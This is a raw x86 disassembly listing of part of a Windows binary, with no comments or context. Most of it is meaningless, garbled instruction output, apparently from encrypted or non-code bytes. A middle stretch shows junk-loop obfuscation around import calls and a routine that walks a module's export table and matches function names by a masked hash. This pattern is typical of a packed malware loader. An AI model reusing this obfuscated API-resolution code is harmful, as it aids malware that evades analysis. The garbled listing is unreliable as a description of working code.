  40cd06:	leave  
  40cd07:	sub    BYTE PTR [ebx+0x559f6687],ah
  40cd0d:	jecxz  0x40cca5
  40cd0f:	popa   
  40cd10:	ror    BYTE PTR [esi-0x55],cl
  40cd13:	and    DWORD PTR [edi],edx
  40cd15:	aad    0xd8
  40cd17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd18:	call   FWORD PTR [ebx+edx*4]
  40cd1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd1c:	shl    DWORD PTR [ebx-0x4cfe3a17],1
  40cd22:	xchg   ebp,eax
  40cd23:	mov    ds:0x34b228f8,eax
  40cd28:	(bad)  
  40cd29:	leave  
  40cd2a:	clc    
  40cd2b:	jl     0x40cd32
  40cd2d:	inc    esp
  40cd2e:	pop    ecx
  40cd2f:	dec    esi
  40cd30:	out    0x91,al
  40cd32:	icebp  
  40cd33:	jmp    0x40ccdd
  40cd35:	dec    edx
  40cd36:	mov    esi,0xb90328ff
  40cd3b:	sbb    al,0x45
  40cd3d:	pop    ebx
  40cd3e:	inc    edx
  40cd3f:	clc    
  40cd40:	adc    al,0xe3
  40cd42:	adc    BYTE PTR [eax-0x3390fc1e],ah
  40cd48:	sbb    al,0x3c
  40cd4a:	mov    cl,0x90
  40cd4c:	std    
  40cd4d:	mov    eax,0x677eb71c
  40cd52:	rol    BYTE PTR [edi],1
  40cd54:	and    al,0x5c
  40cd56:	jle    0x40cda0
  40cd58:	adc    al,0x7d
  40cd5a:	popa   
  40cd5b:	sbb    DWORD PTR [ebx-0x46e1df31],ebx
  40cd61:	dec    ebp
  40cd62:	jmp    0xa6db402b
  40cd67:	xchg   DWORD PTR [eax],edx
  40cd69:	repnz into 
  40cd6b:	xor    eax,0x94756f6b
  40cd70:	push   esp
  40cd71:	adc    al,0xb8
  40cd73:	ret    
  40cd74:	jl     0x40cda2
  40cd76:	pusha  
  40cd77:	sbb    bl,BYTE PTR [eax+0x39]
  40cd7a:	cwde   
  40cd7b:	adc    BYTE PTR [ecx],ah
  40cd7d:	clc    
  40cd7e:	(bad)  
  40cd7f:	cmp    edi,DWORD PTR [edx-0x48]
  40cd82:	out    dx,al
  40cd83:	pop    es
  40cd84:	fst    QWORD PTR ds:0xbcc00a88
  40cd8a:	lods   al,BYTE PTR ds:[esi]
  40cd8b:	daa    
  40cd8c:	jle    0x40cd49
  40cd8e:	pop    edx
  40cd8f:	loop   0x40cd59
  40cd91:	cmp    BYTE PTR [eax-0x6654bb2f],ch
  40cd97:	pop    esi
  40cd98:	mov    bh,0x6c
  40cd9a:	aas    
  40cd9b:	and    al,BYTE PTR [ecx+0x75227bc8]
  40cda1:	loop   0x40cd6d
  40cda3:	jno    0x40cdf2
  40cda5:	push   es
  40cda6:	add    ebx,esi
  40cda8:	fwait
  40cda9:	adc    DWORD PTR [eax-0x6c39f566],ecx
  40cdaf:	(bad)  
  40cdb0:	mov    edx,0x3ccb2c6c
  40cdb5:	outs   dx,DWORD PTR ds:[esi]
  40cdb6:	xchg   edi,eax
  40cdb7:	mov    bh,0x29
  40cdb9:	xchg   ecx,eax
  40cdba:	nop
  40cdbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdbc:	cmp    edx,DWORD PTR [ecx+0x36e7b44]
  40cdc2:	push   edi
  40cdc3:	aad    0x8b
  40cdc5:	retf   0xc5dd
  40cdc8:	mov    esp,0x5b572c75
  40cdcd:	clc    
  40cdce:	push   0x6c5db343
  40cdd3:	inc    eax
  40cdd4:	int3   
  40cdd5:	bound  edi,QWORD PTR [edi]
  40cdd7:	xchg   edx,eax
  40cdd8:	enter  0x3ee9,0xad
  40cddc:	mov    esp,0x44bf78be
  40cde1:	jge    0x40cdd7
  40cde3:	or     BYTE PTR [ecx+0x495fa985],0xe9
  40cdea:	jbe    0x40ce45
  40cdec:	add    dh,BYTE PTR [edx+0x4a8b8afb]
  40cdf2:	push   cs
  40cdf3:	dec    esi
  40cdf4:	xchg   ebp,eax
  40cdf5:	pop    es
  40cdf6:	iret   
  40cdf7:	sub    BYTE PTR ds:0xca71130,dl
  40cdfd:	aas    
  40cdfe:	xchg   ebp,eax
  40cdff:	mov    edi,0x17d07483
  40ce04:	aad    0xdb
  40ce06:	lds    eax,FWORD PTR [esi+0x43]
  40ce09:	mov    ebp,DWORD PTR [ecx+0x6dda8db5]
  40ce0f:	ret    0xce5d
  40ce12:	cmp    al,BYTE PTR [eax+0x130f0a92]
  40ce18:	and    edi,ebx
  40ce1a:	stos   BYTE PTR es:[edi],al
  40ce1b:	(bad)  
  40ce1d:	sub    DWORD PTR [edi+eax*1-0x5f2c107b],0x61
  40ce25:	cmp    edx,eax
  40ce27:	cmc    
  40ce28:	or     ebx,DWORD PTR [edi]
  40ce2a:	outs   dx,BYTE PTR ds:[esi]
  40ce2b:	fiadd  DWORD PTR [edx+0x6cee8b89]
  40ce31:	lea    esp,[eax+0x23]
  40ce34:	(bad)  
  40ce35:	out    0x9b,eax
  40ce37:	mov    edi,0xed851957
  40ce3c:	test   cl,dh
  40ce3e:	es sti 
  40ce40:	test   BYTE PTR [ebp-0x74],0xc6
  40ce44:	enter  0xd8c,0x2f
  40ce48:	jge    0x40ce07
  40ce4a:	push   ds
  40ce4b:	jecxz  0x40ce13
  40ce4d:	mov    bl,0xb4
  40ce4f:	add    dh,BYTE PTR [esi+0x27]
  40ce52:	and    DWORD PTR [edi-0x6c],ebp
  40ce55:	jno    0x40cdff
  40ce57:	(bad)  
  40ce58:	jnp    0x40ce95
  40ce5a:	rcr    bh,0x9b
  40ce5d:	adc    ch,0xb7
  40ce60:	mov    BYTE PTR [esi+0x5a],ch
  40ce63:	in     eax,dx
  40ce64:	dec    ebx
  40ce65:	and    DWORD PTR [ebp+ecx*4-0x12],esi
  40ce69:	pop    edi
  40ce6a:	jne    0x40ce5f
  40ce6c:	sti    
  40ce6d:	sbb    al,0xfd
  40ce6f:	call   0x84fa6f19
  40ce74:	push   edx
  40ce75:	jmp    0x40ceb6
  40ce77:	enter  0xe5cd,0x36
  40ce7b:	pop    esi
  40ce7c:	int3   
  40ce7d:	mov    ah,0x69
  40ce7f:	in     al,0xac
  40ce81:	add    bl,BYTE PTR [ebx]
  40ce83:	shr    BYTE PTR [edx+0x308ab640],1
  40ce89:	in     eax,dx
  40ce8a:	cmp    al,0x20
  40ce8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce8d:	leave  
  40ce8e:	test   BYTE PTR ds:0xf0000a75,ch
  40ce94:	cld    
  40ce95:	or     BYTE PTR [edx+0x51],dl
  40ce98:	mov    cl,0x8b
  40ce9a:	inc    ebp
  40ce9b:	cld    
  40ce9c:	mov    DWORD PTR ds:0x428eab,0x1e
  40cea6:	cmp    DWORD PTR ds:0x428eab,0x0
  40cead:	je     0x40cee0
  40ceb3:	cmp    DWORD PTR ds:0x428eab,0x2d
  40ceba:	ja     0x40cee0
  40cec0:	jmp    0x40cece
  40cec5:	push   DWORD PTR [ebp-0x24]
  40cec8:	call   DWORD PTR ds:0x42a9d3
  40cece:	mov    ebx,DWORD PTR ds:0x428eab
  40ced4:	dec    ebx
  40ced5:	mov    DWORD PTR ds:0x428eab,ebx
  40cedb:	jmp    0x40cea6
  40cee0:	xor    eax,esi
  40cee2:	add    eax,edi
  40cee4:	or     ebx,0x4a81
  40ceea:	mov    DWORD PTR [ebp-0x30],eax
  40ceed:	mov    ebx,DWORD PTR [ebp-0x4]
  40cef0:	or     eax,DWORD PTR ds:0x428e7b
  40cef6:	xor    ebx,esi
  40cef8:	and    DWORD PTR ds:0x428e6b,0x0
  40cf02:	jmp    0x40cf12
  40cf07:	mov    eax,ds:0x428e6b
  40cf0c:	inc    eax
  40cf0d:	mov    ds:0x428e6b,eax
  40cf12:	cmp    DWORD PTR ds:0x428e6b,0x19
  40cf19:	jae    0x40cf59
  40cf1f:	cmp    DWORD PTR ds:0x428e6b,0x8
  40cf26:	jl     0x40cf59
  40cf2c:	jmp    0x40cf3c
  40cf31:	push   0x428189
  40cf36:	call   DWORD PTR ds:0x42a9db
  40cf3c:	cmp    DWORD PTR ds:0x428e6b,0x7
  40cf43:	jne    0x40cf54
  40cf49:	mov    eax,ds:0x428e6b
  40cf4e:	inc    eax
  40cf4f:	mov    ds:0x428e6b,eax
  40cf54:	jmp    0x40cf07
  40cf59:	add    ebx,edi
  40cf5b:	sub    DWORD PTR ds:0x428e8b,ebx
  40cf61:	mov    eax,DWORD PTR [ebp-0x24]
  40cf64:	xor    DWORD PTR ds:0x428ebb,0x518c
  40cf6e:	sub    eax,edi
  40cf70:	lea    ecx,[ebx-0x3272f6]
  40cf76:	xor    eax,esi
  40cf78:	xor    DWORD PTR ds:0x428e67,0x744d
  40cf82:	xor    ecx,esi
  40cf84:	mov    DWORD PTR ds:0x428eb3,0x57aa
  40cf8e:	cmp    ecx,eax
  40cf90:	mov    DWORD PTR ds:0x428e8f,0x2448
  40cf9a:	je     0x40d1fa
  40cfa0:	mov    eax,ds:0x428ebb
  40cfa5:	and    DWORD PTR ds:0x428e2f,eax
  40cfab:	mov    eax,DWORD PTR [ebp-0x4]
  40cfae:	neg    DWORD PTR ds:0x428e73
  40cfb4:	xor    eax,esi
  40cfb6:	inc    DWORD PTR ds:0x428e43
  40cfbc:	add    eax,edi
  40cfbe:	mov    DWORD PTR ds:0x428eab,0x7b11
  40cfc8:	cmp    ebx,eax
  40cfca:	jne    0x40d1d7
  40cfd0:	xor    DWORD PTR ds:0x428e37,0x428e63
  40cfda:	push   DWORD PTR [ebp+0x8]
  40cfdd:	xor    DWORD PTR ds:0x428e83,0x428eaf
  40cfe7:	call   0x421aa4
  40cfec:	or     ecx,DWORD PTR ds:0x428ecb
  40cff2:	mov    DWORD PTR [ebp-0x14],eax
  40cff5:	mov    eax,DWORD PTR [ebp-0x4]
  40cff8:	and    DWORD PTR ds:0x428e97,0x0
  40d002:	mov    ecx,DWORD PTR ds:0x428e97
  40d008:	inc    ecx
  40d009:	mov    DWORD PTR ds:0x428e97,ecx
  40d00f:	cmp    DWORD PTR ds:0x428e97,0x8
  40d016:	jg     0x40d055
  40d01c:	jmp    0x40d02c
  40d021:	push   0x2d20
  40d026:	call   DWORD PTR ds:0x42a9df
  40d02c:	cmp    DWORD PTR ds:0x428e97,0x7
  40d033:	jne    0x40d048
  40d039:	xor    ecx,ecx
  40d03b:	xor    ecx,DWORD PTR ds:0x428e97
  40d041:	inc    ecx
  40d042:	mov    DWORD PTR ds:0x428e97,ecx
  40d048:	cmp    DWORD PTR ds:0x428e97,0x16
  40d04f:	jb     0x40d002
  40d055:	mov    ecx,DWORD PTR [ebp-0x14]
  40d058:	xor    eax,esi
  40d05a:	sbb    DWORD PTR ds:0x428e33,0x7710
  40d064:	add    eax,edi
  40d066:	cmp    ecx,eax
  40d068:	mov    DWORD PTR ds:0x428e93,0x6f23
  40d072:	je     0x40f614
  40d078:	push   DWORD PTR [ebp-0x14]
  40d07b:	xor    DWORD PTR ds:0x428e33,0x5f29
  40d085:	push   DWORD PTR [ebp+0x8]
  40d088:	call   0x423e95
  40d08d:	mov    DWORD PTR [ebp-0x14],eax
  40d090:	mov    eax,DWORD PTR [ebp-0x4]
  40d093:	mov    ecx,DWORD PTR ds:0x428e93
  40d099:	and    DWORD PTR ds:0x428e8b,ecx
  40d09f:	mov    ecx,DWORD PTR [ebp-0x14]
  40d0a2:	neg    DWORD PTR ds:0x428e6b
  40d0a8:	xor    eax,esi
  40d0aa:	sub    DWORD PTR ds:0x428e8b,0x59e8
  40d0b4:	add    eax,edi
  40d0b6:	cmp    ecx,eax
  40d0b8:	je     0x40f614
  40d0be:	and    DWORD PTR ds:0x428e63,0x0
  40d0c8:	jmp    0x40d0da
  40d0cd:	mov    ecx,DWORD PTR ds:0x428e63
  40d0d3:	inc    ecx
  40d0d4:	mov    DWORD PTR ds:0x428e63,ecx
  40d0da:	cmp    DWORD PTR ds:0x428e63,0x14
  40d0e1:	jae    0x40d123
  40d0e7:	cmp    DWORD PTR ds:0x428e63,0xb
  40d0ee:	jbe    0x40d123
  40d0f4:	jmp    0x40d104
  40d0f9:	push   0x4280f7
  40d0fe:	call   DWORD PTR ds:0x42a9e3
  40d104:	cmp    DWORD PTR ds:0x428e63,0xa
  40d10b:	jne    0x40d11e
  40d111:	mov    ecx,DWORD PTR ds:0x428e63
  40d117:	inc    ecx
  40d118:	mov    DWORD PTR ds:0x428e63,ecx
  40d11e:	jmp    0x40d0cd
  40d123:	mov    eax,DWORD PTR [ebp-0x14]
  40d126:	mov    eax,DWORD PTR [eax+0x18]
  40d129:	mov    DWORD PTR [ebp-0x24],eax
  40d12c:	or     ecx,0x560
  40d132:	mov    eax,DWORD PTR [ebp-0x14]
  40d135:	adc    ecx,DWORD PTR ds:0x428e9f
  40d13b:	mov    ecx,DWORD PTR [ebp+0x8]
  40d13e:	add    ecx,DWORD PTR [eax+0x20]
  40d141:	xor    eax,eax
  40d143:	xor    eax,DWORD PTR ds:0x428e7b
  40d149:	sbb    eax,DWORD PTR ds:0x428e67
  40d14f:	mov    ds:0x428e7b,eax
  40d154:	mov    DWORD PTR [ebp-0x2c],ecx
  40d157:	dec    ecx
  40d158:	mov    eax,DWORD PTR [ebp-0x14]
  40d15b:	add    ecx,0x1e8d
  40d161:	mov    ecx,DWORD PTR [ebp+0x8]
  40d164:	add    ecx,DWORD PTR [eax+0x24]
  40d167:	and    DWORD PTR ds:0x428e3b,0x0
  40d171:	mov    eax,ds:0x428e3b
  40d176:	inc    eax
  40d177:	mov    ds:0x428e3b,eax
  40d17c:	cmp    DWORD PTR ds:0x428e3b,0x2c
  40d183:	ja     0x40d1a4
  40d189:	jmp    0x40d197
  40d18e:	push   DWORD PTR [ebp-0x14]
  40d191:	call   DWORD PTR ds:0x42a9e7
  40d197:	cmp    DWORD PTR ds:0x428e3b,0x1f
  40d19e:	jb     0x40d171
  40d1a4:	mov    DWORD PTR [ebp-0x34],ecx
  40d1a7:	mov    eax,ds:0x428e3b
  40d1ac:	and    DWORD PTR ds:0x428e87,eax
  40d1b2:	mov    eax,DWORD PTR [ebp-0x14]
  40d1b5:	xor    DWORD PTR ds:0x428e73,0x264d
  40d1bf:	mov    ecx,DWORD PTR [ebp+0x8]
  40d1c2:	add    ecx,DWORD PTR [eax+0x1c]
  40d1c5:	mov    DWORD PTR ds:0x428e57,0x2595
  40d1cf:	mov    DWORD PTR [ebp-0x14],ecx
  40d1d2:	jmp    0x40f5dc
  40d1d7:	mov    eax,DWORD PTR [ebp-0x2c]
  40d1da:	mov    ecx,DWORD PTR [ebp+0x8]
  40d1dd:	add    ecx,DWORD PTR [eax+ebx*4]
  40d1e0:	mov    DWORD PTR [ebp-0x28],ecx
  40d1e3:	mov    eax,DWORD PTR [ebp-0x4]
  40d1e6:	mov    ecx,DWORD PTR [ebp-0x28]
  40d1e9:	xor    eax,esi
  40d1eb:	add    eax,edi
  40d1ed:	cmp    ecx,eax
  40d1ef:	je     0x40f5dc
  40d1f5:	jmp    0x40f5cd
  40d1fa:	mov    eax,DWORD PTR [ebp-0x4]
  40d1fd:	mov    ecx,DWORD PTR [ebp-0x8]
  40d200:	xor    eax,esi
  40d202:	add    eax,edi
  40d204:	jmp    0x40f5b3
  40d209:	jns    0x40d251
  40d20b:	mov    esp,0x14898cd9
  40d210:	(bad)  
  40d211:	mov    es,WORD PTR [eax+0x4dfa1153]
  40d217:	and    ah,cl
  40d219:	push   ebp
  40d21a:	rol    BYTE PTR [ebx-0x7c9f0e7d],cl
  40d220:	sub    eax,0x5d
  40d223:	pop    esp
  40d224:	fdivr  DWORD PTR [esi-0x36]
  40d227:	iret   
  40d228:	stos   DWORD PTR es:[edi],eax
  40d229:	retf   
  40d22a:	in     al,0x79
  40d22c:	lahf   
  40d22d:	jcxz   0x40d1e2
  40d230:	pop    ebp
  40d231:	fst    QWORD PTR [ebx+0x60073012]
  40d237:	retf   0xfa03
  40d23a:	js     0x40d1ef
  40d23c:	mov    ecx,0x37a1c498
  40d241:	jmp    0x40d1c9
  40d243:	add    eax,0xdbcf3926
  40d248:	inc    ecx
  40d249:	inc    esi
  40d24a:	and    cl,BYTE PTR [ebx]
  40d24c:	adc    al,0xe6
  40d24e:	pop    DWORD PTR [ebx+0x10cfc8db]
  40d254:	andnps xmm7,XMMWORD PTR [edi+0x0]
  40d258:	mov    ebx,ebx
  40d25a:	dec    esp
  40d25b:	mov    bh,0x37
  40d25d:	jae    0x40d238
  40d25f:	mov    DWORD PTR [esi+0x2e4e750f],ebp
  40d265:	(bad)  
  40d266:	ss jb  0x40d25c
  40d269:	shl    BYTE PTR [ebp-0x5e08e293],cl
  40d26f:	aam    0x9f
  40d271:	push   es
  40d272:	(bad)  
  40d273:	jo     0x40d282
  40d275:	mov    WORD PTR [eax-0x4d16ef50],fs
  40d27b:	or     eax,0x9ac29291
  40d280:	add    esp,ebx
  40d282:	mov    edx,0xd6aa9cd
  40d287:	pop    ds
  40d288:	leave  
  40d289:	shr    BYTE PTR [eax],1
  40d28b:	add    ebx,DWORD PTR [ecx+0x66]
  40d28e:	jmp    0x40d293
  40d290:	das    
  40d291:	aas    
  40d292:	fcom   QWORD PTR [eiz*4-0x5eb097e9]
  40d299:	or     eax,0x42d7c42a
  40d29e:	push   esi
  40d29f:	sub    DWORD PTR [ebp+0x59d6542e],eax
  40d2a5:	push   edi
  40d2a6:	or     bl,BYTE PTR [eax]
  40d2a8:	sti    
  40d2a9:	shr    DWORD PTR [ebx+0x19],cl
  40d2ac:	ret    
  40d2ad:	cmp    eax,0x2571e066
  40d2b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2b3:	cmp    al,0x1a
  40d2b5:	mov    cl,0xb6
  40d2b7:	(bad)  
  40d2b9:	dec    ecx
  40d2ba:	mov    ecx,0xfab833d0
  40d2bf:	hlt    
  40d2c0:	xor    cl,cl
  40d2c2:	jbe    0x40d304
  40d2c4:	hlt    
  40d2c5:	out    dx,al
  40d2c6:	mov    bl,0xb8
  40d2c8:	out    0x81,al
  40d2ca:	ins    BYTE PTR es:[edi],dx
  40d2cb:	ins    BYTE PTR es:[edi],dx
  40d2cc:	inc    ecx
  40d2cd:	jl     0x40d2a1
  40d2cf:	dec    edx
  40d2d0:	mov    ebp,0x9a75ade
  40d2d5:	mov    WORD PTR [ebp-0x2d],es
  40d2d8:	fwait
  40d2d9:	xchg   edx,eax
  40d2da:	fst    QWORD PTR [ebp+edi*8+0x4ef8d2c1]
  40d2e1:	dec    edx
  40d2e2:	or     BYTE PTR [edi-0x55af91b3],bl
  40d2e8:	sbb    bh,dh
  40d2ea:	adc    DWORD PTR [eax],esp
  40d2ec:	mov    ebx,0xeb7aec7e
  40d2f1:	sbb    DWORD PTR [si+0x33],esi
  40d2f5:	lds    esp,FWORD PTR [edi+0x5012eb48]
  40d2fb:	popf   
  40d2fc:	add    eax,DWORD PTR [ecx]
  40d2fe:	jae    0x40d354
  40d300:	rcr    esp,0x6c
  40d303:	div    BYTE PTR [edi-0x65072436]
  40d309:	(bad)  
  40d30a:	jmp    0x7fa2:0xe5cfc9e2
  40d311:	dec    ebp
  40d312:	es ds out dx,eax
  40d315:	mov    edi,0xc1723332
  40d31a:	mov    cl,0x66
  40d31c:	ss in  al,dx
  40d31e:	inc    esi
  40d31f:	mov    eax,0xd4ae4a84
  40d324:	pop    ecx
  40d325:	mov    eax,0x86d82b8
  40d32a:	mov    eax,0x7b699a4
  40d32f:	mov    eax,0x6ff9c833
  40d334:	sti    
  40d335:	jle    0x40d2c5
  40d337:	jb     0x40d35c
  40d339:	scas   al,BYTE PTR es:[edi]
  40d33a:	mov    dh,0xdf
  40d33c:	sub    DWORD PTR [edx+ebp*8-0x7a70d86],0x43f0a643
  40d347:	cs fwait
  40d349:	adc    al,0x50
  40d34b:	les    edi,FWORD PTR [esp+eax*1-0x2e]
  40d34f:	adc    cl,BYTE PTR [edi+esi*8-0x7e]
  40d353:	inc    esp
  40d354:	retf   
  40d355:	jg     0x40d310
  40d357:	or     al,0xfd
  40d359:	mov    ds,ebx
  40d35b:	ins    BYTE PTR es:[edi],dx
  40d35c:	dec    esi
  40d35d:	jne    0x40d30a
  40d35f:	enter  0x64d3,0xb3
  40d363:	jl     0x40d359
  40d365:	dec    ebx
  40d366:	and    edx,eax
  40d368:	and    eax,0x12cf8d1c
  40d36d:	idiv   DWORD PTR [ebx]
  40d36f:	add    al,0x5c
  40d371:	in     al,dx
  40d372:	sbb    BYTE PTR [ecx],ch
  40d374:	jno    0x40d3ee
  40d376:	xor    dl,dl
  40d378:	out    dx,al
  40d379:	push   edi
  40d37a:	retf   
  40d37b:	mov    bh,0x8b
  40d37d:	mov    esi,0xb57648d6
  40d382:	dec    di
  40d384:	jb     0x40d401
  40d386:	pop    eax
  40d387:	mov    BYTE PTR [esi+0x2d],bh
  40d38a:	adc    bh,BYTE PTR [edx]
  40d38c:	outs   dx,BYTE PTR ds:[esi]
  40d38d:	xchg   DWORD PTR [esi+0x5f],ecx
  40d390:	jge    0x40d34a
  40d392:	nop
  40d393:	and    ebp,0xffffffcb
  40d396:	(bad)  
  40d397:	mov    esi,0x8879d09c
  40d39c:	mov    eax,0xe453c3e6
  40d3a1:	test   al,0xf9
  40d3a3:	cdq    
  40d3a4:	sub    DWORD PTR [ecx],ebx
  40d3a6:	sahf   
  40d3a7:	ins    BYTE PTR es:[edi],dx
  40d3a8:	mov    ebp,esp
  40d3aa:	rol    edi,cl
  40d3ac:	mov    esp,0x9a4e3db
  40d3b1:	cmp    esp,DWORD PTR [edi+edx*2]
  40d3b4:	sbb    BYTE PTR [edi+esi*4-0x14],dl
  40d3b8:	xchg   edi,eax
  40d3b9:	cmp    eax,0xda103860
  40d3be:	pop    ecx
  40d3bf:	or     ah,BYTE PTR [ebx+ebx*8-0x8]
  40d3c3:	fisub  DWORD PTR [edx]
  40d3c5:	aad    0x3
  40d3c7:	sbb    esi,ebx
  40d3c9:	icebp  
  40d3ca:	inc    ecx
  40d3cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3cc:	mov    ebp,0x41339c8b
  40d3d1:	out    dx,al
  40d3d2:	inc    edi
  40d3d3:	int    0xaa
  40d3d5:	arpl   WORD PTR [ebx+0x3f85737c],si
  40d3db:	out    dx,al
  40d3dc:	push   eax
  40d3dd:	xchg   esi,eax
  40d3de:	xchg   ebp,eax
  40d3df:	out    dx,eax
  40d3e0:	lock test al,0x91
  40d3e3:	data16 cmp bl,BYTE PTR [ecx+0x66842688]
  40d3ea:	jo     0x40d45d
  40d3ec:	mov    al,ds:0xe022bf86
  40d3f1:	in     al,0x93
  40d3f3:	mov    esi,0x2a4e3a53
  40d3f8:	loop   0x40d3a9
  40d3fa:	jnp    0x40d403
  40d3fc:	int3   
  40d3fd:	and    eax,0xf37904a
  40d402:	lock sub eax,0xaa371773
  40d408:	cli    
  40d409:	push   esp
  40d40a:	push   eax
  40d40b:	mov    esp,0x6e1e34a0
  40d410:	sahf   
  40d411:	fiadd  WORD PTR [ebp-0x7235616c]
  40d417:	dec    ebx
  40d418:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d419:	pop    es
  40d41a:	dec    ecx
  40d41b:	jb     0x40d47d
  40d41d:	jecxz  0x40d40c
  40d41f:	pop    esp
  40d420:	mov    al,0x7c
  40d422:	pop    edx
  40d423:	scas   eax,DWORD PTR es:[edi]
  40d424:	mov    esi,0xea0c4b5f
  40d429:	xchg   edx,eax
  40d42a:	add    al,0x31
  40d42c:	mov    esp,ecx
  40d42e:	dec    edx
  40d42f:	mov    eax,ds:0x5463687e
  40d434:	rep ins DWORD PTR es:[edi],dx
  40d436:	and    al,0x2
  40d438:	or     DWORD PTR [edi-0x27],eax
  40d43b:	xor    ebp,DWORD PTR [ecx]
  40d43d:	mov    ecx,0x155d017c
  40d442:	repz pop edi
  40d444:	clc    
  40d445:	push   edi
  40d446:	icebp  
  40d447:	ret    0x9eb9
  40d44a:	aad    0x75
  40d44c:	mov    al,ds:0x585aef24
  40d451:	out    0x30,al
  40d453:	nop
  40d454:	(bad)  
  40d455:	pop    ebp
  40d456:	mov    ah,0xe5
  40d458:	test   al,0x79
  40d45a:	sbb    BYTE PTR [eax],al
  40d45c:	cmp    cl,BYTE PTR [ebp+0x35]
  40d45f:	out    dx,eax
  40d460:	push   DWORD PTR [ecx+edi*2-0xb]
  40d464:	test   eax,0x2013d8c1
  40d469:	or     bh,BYTE PTR [eax]
  40d46b:	xchg   esp,eax
  40d46c:	out    0x80,eax
  40d46e:	retf   0x5aab
  40d471:	test   DWORD PTR [ecx+0x2dcf84d6],ecx
  40d477:	add    ebp,ebx
  40d479:	cli    
  40d47a:	push   ecx
  40d47b:	adc    BYTE PTR [eax-0x1a59b65d],0xf3
  40d482:	stc    
  40d483:	adc    al,0x81
  40d485:	fiadd  DWORD PTR [edx-0x63]
  40d488:	sbb    DWORD PTR [ebx+0x3fed011f],0x3c
  40d48f:	ds leave 
  40d491:	retf   0x5506
  40d494:	enter  0xff94,0xbe
  40d498:	cmc    
  40d499:	jmp    0x40d4a1
  40d49b:	dec    edx
  40d49c:	mov    edx,0xc753f110
  40d4a1:	lock and edi,DWORD PTR [ecx]
  40d4a4:	sahf   
  40d4a5:	call   0xca2e7e63
  40d4aa:	add    DWORD PTR [esi],ebp
  40d4ac:	inc    ebx
  40d4ad:	mov    esp,0x87646dfe
  40d4b2:	xor    al,0x26
  40d4b4:	lahf   
  40d4b5:	in     al,dx
  40d4b6:	lahf   
  40d4b7:	fdivr  QWORD PTR [edx]
  40d4b9:	and    DWORD PTR [edi+ecx*1-0x6aa21e12],eax
  40d4c0:	xor    DWORD PTR [ebx],ebx
  40d4c2:	xchg   DWORD PTR ds:0xa3a928b5,esi
  40d4c8:	sti    
  40d4c9:	or     cl,BYTE PTR [ebp-0x25a4601b]
  40d4cf:	jo     0x40d528
  40d4d1:	mov    edi,0x91096724
  40d4d6:	mov    esi,0x9efdb595
  40d4db:	cs pop eax
  40d4dd:	ret    0xbe2b
  40d4e0:	popf   
  40d4e1:	in     al,dx
  40d4e2:	out    dx,al
  40d4e3:	into   
  40d4e4:	mov    bl,0x1c
  40d4e6:	xor    eax,0x75c8dcb1
  40d4eb:	cld    
  40d4ec:	push   edi
  40d4ed:	xor    eax,0x4cef60b7
  40d4f2:	ins    BYTE PTR es:[edi],dx
  40d4f3:	add    eax,0x3284eb93
  40d4f8:	outs   dx,DWORD PTR ds:[esi]
  40d4f9:	out    0xfe,eax
  40d4fb:	adc    esp,edx
  40d4fd:	ret    
  40d4fe:	pushf  
  40d4ff:	mov    eax,ds:0xb7078729
  40d504:	and    DWORD PTR [ebx-0x5b703be5],edx
  40d50a:	xor    BYTE PTR [ebx-0x43],dh
  40d50d:	adc    DWORD PTR [edx+eiz*2-0x6b900a7e],0x212a0caa
  40d518:	test   dh,al
  40d51a:	sbb    eax,0x4c86a05d
  40d51f:	pop    ebx
  40d520:	dec    ecx
  40d521:	mov    esp,DWORD PTR [edi]
  40d523:	mov    WORD PTR [edx+0x18],?
  40d526:	xchg   BYTE PTR [eax+0x1e],al
  40d529:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d52a:	(bad)  
  40d52c:	test   BYTE PTR [edi-0xa],0xf
  40d530:	call   0x24edb296
  40d535:	scas   al,BYTE PTR es:[edi]
  40d536:	mov    dh,0xa1
  40d538:	(bad)  
  40d539:	pop    eax
  40d53a:	and    cl,dh
  40d53c:	pop    ss
  40d53d:	inc    ebp
  40d53e:	(bad)  
  40d540:	rcr    DWORD PTR [eax+0x7a],0xe3
  40d544:	outs   dx,DWORD PTR ds:[esi]
  40d545:	into   
  40d546:	jb     0x40d509
  40d548:	sub    al,0x45
  40d54a:	dec    ecx
  40d54b:	imul   edx,DWORD PTR [esi+0x4d45dfa0],0xffffffbd
  40d552:	ret    
  40d553:	fcomp  st(2)
  40d555:	push   ss
  40d556:	dec    eax
  40d557:	sub    al,0x24
  40d559:	add    ch,BYTE PTR [edx]
  40d55b:	idiv   DWORD PTR [eax+0x7191b024]
  40d561:	and    bh,BYTE PTR [eax+0x75cb0f9d]
  40d567:	mov    ebx,0xbad1fca
  40d56c:	push   ebx
  40d56d:	xchg   ecx,eax
  40d56e:	inc    esp
  40d56f:	sbb    al,0xc6
  40d571:	jbe    0x40d55b
  40d573:	scas   al,BYTE PTR es:[edi]
  40d574:	adc    bl,al
  40d576:	fimul  DWORD PTR [eax+0x7089d597]
  40d57c:	repz loopne 0x40d5a2
  40d57f:	mov    ah,0x3c
  40d581:	int3   
  40d582:	jbe    0x40d598
  40d584:	out    0xf4,eax
  40d586:	fild   WORD PTR [ebp+0x297f32d9]
  40d58c:	std    
  40d58d:	jmp    0x40d5fb
  40d58f:	bound  edx,QWORD PTR [ebp+0x4b]
  40d592:	test   BYTE PTR [ebp+0x4b],ch
  40d595:	or     eax,0x2748804
  40d59a:	jge    0x40d59d
  40d59c:	repnz or al,0xf1
  40d59f:	push   esp
  40d5a0:	cdq    
  40d5a1:	fs out 0xee,al
  40d5a4:	aaa    
  40d5a5:	or     eax,ebp
  40d5a7:	scas   al,BYTE PTR es:[edi]
  40d5a8:	push   ebp
  40d5a9:	mov    cl,0x92
  40d5ab:	mov    dl,0xee
  40d5ad:	retf   0x3ef1
  40d5b0:	and    BYTE PTR [ecx],0x87
  40d5b3:	pop    es
  40d5b4:	dec    ebp
  40d5b5:	adc    DWORD PTR [edi],0xffffff85
  40d5b8:	dec    bp
  40d5ba:	fstp   DWORD PTR [ebp-0x4a]
  40d5bd:	mov    ds:0xc1547611,eax
